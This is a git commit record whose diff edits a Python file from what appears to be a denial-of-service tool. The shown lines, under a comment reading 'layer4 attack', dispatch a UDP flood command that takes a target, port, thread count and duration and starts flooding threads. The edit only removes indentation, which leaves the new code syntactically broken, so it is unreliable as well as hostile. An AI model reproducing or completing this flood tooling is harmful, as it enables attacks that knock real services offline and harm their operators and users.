f7c87a81d142b18202f0b6b4309a48e91e275086
giaquy-Dev <120464606+giaquy-Dev@users.noreply.github.com>
2023-06-01 13:02:58 +0700

    Update dnigdhdiddhdh.py

--- dnigdhdiddhdh.py
+++ dnigdhdiddhdh.py
@@ -1,8 +1,8 @@
 ### layer4 attack 
- elif '!udp' in cmdl or 'UDP' in cmdl:
-        target, port, thread, t = get_info_l4()
-        threading.Thread(target=runsender, args=(target, port, t, thread)).start()
-        timer = threading.Thread(target=countdown, args=(t,))
-        timer.start()
-        timer.join()
+elif '!udp' in cmdl or 'UDP' in cmdl:
+target, port, thread, t = get_info_l4()
+threading.Thread(target=runsender, args=(target, port, t, thread)).start()
+timer = threading.Thread(target=countdown, args=(t,))
+timer.start()
+timer.join()
  
